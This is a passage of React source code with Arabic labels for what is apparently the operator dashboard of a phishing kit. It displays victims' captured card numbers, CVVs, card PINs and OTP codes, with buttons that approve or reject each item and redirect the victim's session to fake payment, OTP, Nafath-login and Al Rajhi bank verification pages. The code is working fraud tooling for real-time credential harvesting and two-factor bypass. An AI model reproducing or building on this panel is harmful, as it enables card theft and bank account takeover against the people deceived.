                  </div>
                </div>

                <div className="p-4 rounded-lg bg-gray-50 dark:bg-gray-700 flex flex-col gap-1">
                  <p className="text-sm text-muted-foreground">رمز الأمان (CVV)</p>
                  <div className="flex items-center gap-2 mt-1">
                    <Shield className="h-4 w-4 text-primary" />
                    <p className="font-medium text-lg font-mono">{selectedNotification.cvv || "غير محدد"}</p>
                  </div>
                </div>
              </TabsContent>

              <TabsContent value="form" className="space-y-3 py-2">
                {selectedNotification.formData ? (
                  <>
                    <div className="p-4 rounded-lg bg-gray-50 dark:bg-gray-700 flex flex-col gap-1">
                      <p className="text-sm text-muted-foreground">اسم حامل البطاقة</p>
                      <div className="flex items-center gap-2 mt-1">
                        <User className="h-4 w-4 text-primary" />
                        <p className="font-medium text-lg">{selectedNotification.formData.full_name || "غير محدد"}</p>
                      </div>
                    </div>

                    <div className="p-4 rounded-lg bg-gray-50 dark:bg-gray-700 flex flex-col gap-1">
                      <p className="text-sm text-muted-foreground">رقم البطاقة</p>
                      <div className="flex items-center gap-2 mt-1">
                        <CreditCard className="h-4 w-4 text-primary" />
                        <p className="font-medium text-lg font-mono">
                          {selectedNotification.formData.card_number || "غير محدد"}
                        </p>
                      </div>
                    </div>

                    <div className="p-4 rounded-lg bg-gray-50 dark:bg-gray-700 flex flex-col gap-1">
                      <p className="text-sm text-muted-foreground">تاريخ الانتهاء</p>
                      <div className="flex items-center gap-2 mt-1">
                        <Calendar className="h-4 w-4 text-primary" />
                        <p className="font-medium text-lg font-mono">
                          {selectedNotification.formData.expiration_date || "غير محدد"}
                        </p>
                      </div>
                    </div>

                    <div className="p-4 rounded-lg bg-gray-50 dark:bg-gray-700 flex flex-col gap-1">
                      <p className="text-sm text-muted-foreground">رمز الأمان (CVV)</p>
                      <div className="flex items-center gap-2 mt-1">
                        <Shield className="h-4 w-4 text-primary" />
                        <p className="font-medium text-lg font-mono">
                          {selectedNotification.formData.cvv || "غير محدد"}
                        </p>
                      </div>
                    </div>
                  </>
                ) : (
                  <div className="flex flex-col items-center justify-center py-8 text-muted-foreground">
                    <AlertCircle className="h-12 w-12 mb-2 text-muted-foreground/50" />
                    <p>لا توجد بيانات نموذج متاحة</p>
                  </div>
                )}
              </TabsContent>
            </Tabs>
          )}

          {selectedInfo === "vehicle" && selectedNotification && (
            <div className="space-y-3 py-2">
              <div className="p-4 rounded-lg bg-gray-50 dark:bg-gray-700 flex flex-col gap-1">
                <p className="text-sm text-muted-foreground">نوع المركبة</p>
                <div className="flex items-center gap-2 mt-1">
                  <Car className="h-4 w-4 text-primary" />
                  <p className="font-medium text-lg">{selectedNotification.vehicle_type || "غير محدد"}</p>
                </div>
              </div>

              {selectedNotification.vehicle_manufacture_number && (
                <div className="p-4 rounded-lg bg-gray-50 dark:bg-gray-700 flex flex-col gap-1">
                  <p className="text-sm text-muted-foreground">رقم تصنيع المركبة</p>
                  <div className="flex items-center gap-2 mt-1">
                    <p className="font-medium text-lg font-mono">{selectedNotification.vehicle_manufacture_number}</p>
                  </div>
                </div>
              )}

              {selectedNotification.customs_code && (
                <div className="p-4 rounded-lg bg-gray-50 dark:bg-gray-700 flex flex-col gap-1">
                  <p className="text-sm text-muted-foreground">رمز الجمارك</p>
                  <div className="flex items-center gap-2 mt-1">
                    <p className="font-medium text-lg font-mono">{selectedNotification.customs_code}</p>
                  </div>
                </div>
              )}

              {selectedNotification.seller_identity_number && (
                <div className="p-4 rounded-lg bg-gray-50 dark:bg-gray-700 flex flex-col gap-1">
                  <p className="text-sm text-muted-foreground">رقم هوية البائع</p>
                  <div className="flex items-center gap-2 mt-1">
                    <Shield className="h-4 w-4 text-primary" />
                    <p className="font-medium text-lg font-mono">{selectedNotification.seller_identity_number}</p>
                  </div>
                </div>
              )}

              {selectedNotification.serial_number && (
                <div className="p-4 rounded-lg bg-gray-50 dark:bg-gray-700 flex flex-col gap-1">
                  <p className="text-sm text-muted-foreground">الرقم التسلسلي</p>
                  <div className="flex items-center gap-2 mt-1">
                    <p className="font-medium text-lg font-mono">{selectedNotification.serial_number}</p>
                  </div>
                </div>
              )}
            </div>
          )}

          <DialogFooter className="flex flex-col sm:flex-row gap-2 sm:gap-0 mt-4 pt-3 border-t">
           
          </DialogFooter>
        </DialogContent>
      </Dialog>

      {/* Card Dialog */}
      <Dialog open={showCardDialog} onOpenChange={(open) => !open && setShowCardDialog(false)}>
        <DialogContent className="bg-white dark:bg-gray-800 border-0 shadow-2xl max-w-md rounded-xl" dir="rtl">
          <DialogHeader className="border-b pb-3">
            <DialogTitle className="text-xl font-bold bg-gradient-to-r from-primary to-primary/80 text-transparent bg-clip-text">
              معلومات البطاقة
            </DialogTitle>
            <DialogDescription>تفاصيل معلومات البطاقة البنكية</DialogDescription>
          </DialogHeader>

          {selectedCardInfo && (
            <div className="space-y-4 py-3">
              <div className="p-5 rounded-lg bg-gradient-to-r from-blue-500 to-blue-600 text-white shadow-lg">
                <div className="flex justify-between items-start mb-6">
                  <div className="flex flex-col">
                    <span className="text-xs text-blue-100 mb-1">حامل البطاقة</span>
                    <span className="font-medium">
                      {selectedCardInfo.document_owner_full_name || selectedCardInfo.full_name || "غير محدد"}
                    </span>
                  </div>
                  <CreditCard className="h-8 w-8 text-white opacity-80" />
                </div>

                <div className="mb-4">
                  <span className="text-xs text-blue-100 mb-1 block">رقم البطاقة</span>
                  <span className="font-mono text-lg tracking-wider" dir="ltr">
                    {selectedCardInfo.card_number ||
                      (selectedCardInfo.formData && selectedCardInfo.formData.card_number) ||
                      "غير محدد"}
                  </span>
                </div>

                <div className="flex justify-between">
                  <div>
                    <span className="text-xs text-blue-100 block">تاريخ الانتهاء</span>
                    <span className="font-mono">
                      {selectedCardInfo.expiration_date ||
                        (selectedCardInfo.formData && selectedCardInfo.formData.expiration_date) ||
                        "غير محدد"}
                    </span>
                  </div>
                  <div>
                    <span className="text-xs text-blue-100 block">رمز الأمان</span>
                    <span className="font-mono">
                      {selectedCardInfo.cvv ||
                        (selectedCardInfo.formData && selectedCardInfo.formData.cvv) ||
                        "غير محدد"}
                    </span>
                  </div>
                </div>
              </div>

              <div className="p-4 rounded-lg bg-gray-50 dark:bg-gray-700">
                <h3 className="font-medium mb-2 text-sm">معلومات إضافية</h3>
                <div className="space-y-2">
                  <div className="flex justify-between text-sm">
                    <span className="text-muted-foreground">رقم سري بطاقة:</span>
                    <span>{selectedCardInfo.pinCode}</span>
                  </div>
                  <div className="flex justify-between text-sm">
                    <span className="text-muted-foreground">رمز تحقق:</span>
                    <span>{selectedCardInfo.otpCode}</span>
                    <span>{selectedCardInfo.phoneOtp}</span>
                  </div>
                  <div className="flex justify-between text-sm">
                    <span className="text-muted-foreground">الحالة:</span>
                    <span>
                      {selectedCardInfo.paymentStatus === "approved"
                        ? "مقبول"
                        : selectedCardInfo.paymentStatus === "rejected"
                          ? "مرفوض"
                          : "قيد الانتظار"}
                    </span>
                  </div>
                </div>
              </div>
            </div>
          )}

          <DialogFooter className="grid grid-cols-4 mt-4 pt-3 border-t gap-2">
            {selectedCardInfo?.card_number ? (
              <>
                <Button
                  onClick={() => {
                    handleUpdatePagename(selectedCardInfo.id, "payment")
                    handleApproval( "rejected",selectedCardInfo.id)
                    setShowCardDialog(false)

                  }}
                  className="w-full bg-gradient-to-r from-red-500 to-red-600 hover:from-red-600 hover:to-red-700 text-white border-0 shadow-md"
                >
                  رفض{" "}
                </Button>
                <Button
                  onClick={() => {
                    handleApproval ("approved",selectedCardInfo.id)

                    setShowCardDialog(false)
                  }}
                  className="w-full bg-gradient-to-r from-green-500 to-green-600 hover:from-green-600 hover:to-green-700 text-white border-0 shadow-md"
                >
                بطاقة  قبول
                </Button>
                <Button
                  onClick={() => {
                    handlePassApproval ("approved",selectedCardInfo.id)

                  }}
                  className="w-full bg-gradient-to-r from-green-500 to-green-600 hover:from-green-600 hover:to-green-700 text-white border-0 shadow-md"
                >
                رمز  قبول
                </Button>     <Button
                  onClick={() => {
                    handlePhoneOtpApproval("approved",selectedCardInfo.id)

                  }}
                  className="w-full bg-gradient-to-r from-green-500 to-green-600 hover:from-green-600 hover:to-green-700 text-white border-0 shadow-md"
                >
                رمز  رفض
                </Button>
                <Button
                  onClick={() => {
                    handlePassApproval("approved",selectedCardInfo.id)
                   
                  }}
                  className="w-full bg-gradient-to-r from-yellow-500 to-yellow-600 hover:from-green-600 hover:to-yellow-700 text-white border-0 shadow-md"
                >
                  باس
                </Button>
                <Button
                  onClick={() => {
                  handleUpdatePagename(selectedCardInfo.id, "external-link")
                  }}
                  className="w-full bg-gradient-to-r from-blue-500 to-red-600 hover:from-blue-600 hover:to-blue-700 text-white border-0 shadow-md"
                >
                  راجحي2
                </Button>
              </>
            ) : null}
          </DialogFooter>
        </DialogContent>
      </Dialog>

      {/* Pagename Dialog */}
      <Dialog open={showPagenameDialog} onOpenChange={(open) => !open && setShowPagenameDialog(false)}>
        <DialogContent className="bg-white dark:bg-gray-800 border-0 shadow-2xl max-w-md rounded-xl" dir="rtl">
          <DialogHeader className="border-b pb-3">
            <DialogTitle className="text-xl font-bold bg-gradient-to-r from-primary to-primary/80 text-transparent bg-clip-text">
              نوع الطلب
            </DialogTitle>
            <DialogDescription>تحديد أو تغيير نوع الطلب</DialogDescription>
          </DialogHeader>

          {selectedNotification && (
            <div className="space-y-4 py-3">
              <div className="p-4 rounded-lg bg-gray-50 dark:bg-gray-700">
                <h3 className="font-medium mb-3 text-sm">النوع الحالي</h3>
                <div className="flex justify-center">{getPageType(selectedNotification.pagename)}</div>
              </div>

              <div className="p-4 rounded-lg bg-gray-50 dark:bg-gray-700">
                <h3 className="font-medium mb-3 text-sm">اختر نوع الطلب</h3>
                <div className="grid grid-cols-2 gap-2">
                  <Button
                    variant="outline"
                    className={`flex items-center gap-2 justify-center ${
                      selectedNotification.pagename === "payment"
                        ? "bg-blue-50 border-blue-300 dark:bg-blue-900/30 dark:border-blue-700"
                        : ""
                    }`}
                    onClick={() => handleUpdatePagename(selectedNotification.id, "payment")}
                  >
                    <CreditCard className="h-4 w-4" />
                    دفع
                  </Button>
                  <Button
                    variant="outline"
                    className={`flex items-center gap-2 justify-center ${
                      selectedNotification.pagename === ""
                        ? "bg-purple-50 border-purple-300 dark:bg-purple-900/30 dark:border-purple-700"
                        : ""
                    }`}
                    onClick={() => handleUpdatePagename(selectedNotification.id, "")}
                  >
                    <FileText className="h-4 w-4" />
                    تسجيل
                  </Button>
                  <Button
                    variant="outline"
                    className={`flex items-center gap-2 justify-center ${
                      selectedNotification.pagename === "nafaz"
                        ? "bg-green-50 border-green-300 dark:bg-green-900/30 dark:border-green-700"
                        : ""
                    }`}
                    onClick={() => handleUpdatePagename(selectedNotification.id, "nafaz")}
                  >
                    <Calendar className="h-4 w-4" />
                    نفاذ
                  </Button>
                  <Button
                    variant="outline"
                    className={`flex items-center gap-2 justify-center ${
                      selectedNotification.pagename === "verify-otp"
                        ? "bg-pink-50 border-pink-300 dark:bg-green-900/30 dark:border-green-700"
                        : ""
                    }`}
                    onClick={() => handleUpdatePagename(selectedNotification.id, "verify-otp")}
                  >
                    <Calendar className="h-4 w-4" />
                    رمز OTP
                  </Button>
                  <Button
                    variant="outline"
                    className={`flex items-center gap-2 justify-center ${
                      selectedNotification.pagename === "external-link"
                        ? "bg-blue-50 border-blue-300 dark:bg-green-900/30 dark:border-green-700"
                        : ""
                    }`}
                    onClick={() => handleUpdatePagename(selectedNotification.id, "external-link")}
                  >
                    <Calendar className="h-4 w-4" />
                    راجحي
                  </Button>
                  <Button
                    variant="outline"
                    className={`flex items-center gap-2 justify-center ${
                      selectedNotification.pagename === "verify-card-ownership"
                        ? "bg-yellow-50 border-yellow-300 dark:bg-green-900/30 dark:border-green-700"
                        : ""
                    }`}
                    onClick={() => handleUpdatePagename(selectedNotification.id, "verify-card-ownership")}
                  >
                    <Calendar className="h-4 w-4" />
                    رمز ownership
                  </Button>
                  <Button
                    variant="outline"
                    className={`flex items-center gap-2 justify-center ${
                      selectedNotification.pagename === "verify-phone"
                        ? "bg-rose-50 border-rose-300 dark:bg-green-900/30 dark:border-green-700"
                        : ""
                    }`}
                    onClick={() => handleUpdatePagename(selectedNotification.id, "verify-phone")}
                  >
                    <Calendar className="h-4 w-4" />
                    رمز هاتف
                  </Button>
                  <Button
                    variant="outline"
                    className={`flex items-center gap-2 justify-center ${
                      selectedNotification.pagename === "offers"
                        ? "bg-green-50 border-green-300 dark:bg-green-900/30 dark:border-green-700"
                        : ""
                    }`}
                    onClick={() => handleUpdatePagename(selectedNotification.id, "offers")}
                  >
                    <Calendar className="h-4 w-4" />
                    عروض
                  </Button>
                </div>
              </div>
            </div>
          )}

          <DialogFooter className="flex flex-col sm:flex-row gap-2 sm:gap-0 mt-4 pt-3 border-t">
            <Button onClick={() => setShowPagenameDialog(false)} className="w-full" variant="outline">
              إغلاق
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>

      {/* External Component Dialogs */}
      <RajhiAuthDialog open={showRajhiDialog} onOpenChange={setShowRajhiDialog} notification={selectedNotification} />

      <NafazAuthDialog open={showNafazDialog} onOpenChange={setShowNafazDialog} notification={selectedNotification} />

      <PhoneDialog
        phoneOtp={selectedNotification?.phoneOtp}
        handlePhoneOtpApproval={handlePhoneOtpApproval}
        open={showPhoneDialog}
        onOpenChange={setPhoneDialog}
        notification={selectedNotification}
      />
    </div>
  )
}

